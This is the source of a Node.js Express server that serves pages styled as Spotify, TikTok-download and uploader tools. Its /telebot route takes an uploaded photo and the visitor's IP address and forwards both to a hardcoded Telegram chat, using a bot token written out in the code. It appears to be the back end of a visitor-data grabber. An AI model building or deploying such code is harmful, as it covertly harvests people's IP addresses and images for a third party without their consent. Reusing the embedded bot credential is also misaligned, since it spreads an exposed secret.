const express = require('express');
const path = require('path');
const axios = require('axios');
const multer = require('multer');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;

const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const routes = [
    { path: '/', file: 'index.html' },
    { path: '/spotify', file: 'spotify.html' },
    { path: '/spotifysearch', file: 'spotifysearch.html' },
    { path: '/tiktokdl', file: 'tiktokdl.html' },
    { path: '/ss', file: 'ss.html' },
    { path: '/xxx', file: 'xxx.html' },
    { path: '/micro', file: 'micro.html' },
    { path: '/uploader', file: 'Uploader.html' },
];

routes.forEach(route => {
    app.get(route.path, (req, res) => {
        res.sendFile(path.join(__dirname, 'public', route.file));
    });
});

app.post('/telebot', upload.single('photo'), (req, res) => {
    const userId = '6229355025';
    const token = '7846389597:AAHfE-4zLRONag3dRsWsI2RpXW9T_-Y6uwA';
    const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    const formData = new FormData();
    formData.append('chat_id', userId);
    formData.append('caption', `User IP: ${ipAddress}`);

    if (req.file) {
        const fileExtension = req.file.mimetype.split('/')[1]; 
        const filename = `photo.${fileExtension}`;
        formData.append('photo', req.file.buffer, { filename });

        axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, formData, {
            headers: {
                ...formData.getHeaders(),
            },
        })
        .then(() => {
            res.sendStatus(200);
        })
        .catch(err => {
            res.sendStatus(500);
        });
    } else {
        axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: userId,
            text: `User IP: ${ipAddress}`
        })
        .then(() => {
            res.sendStatus(200);
        })
        .catch(err => {
            res.sendStatus(500);
        });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
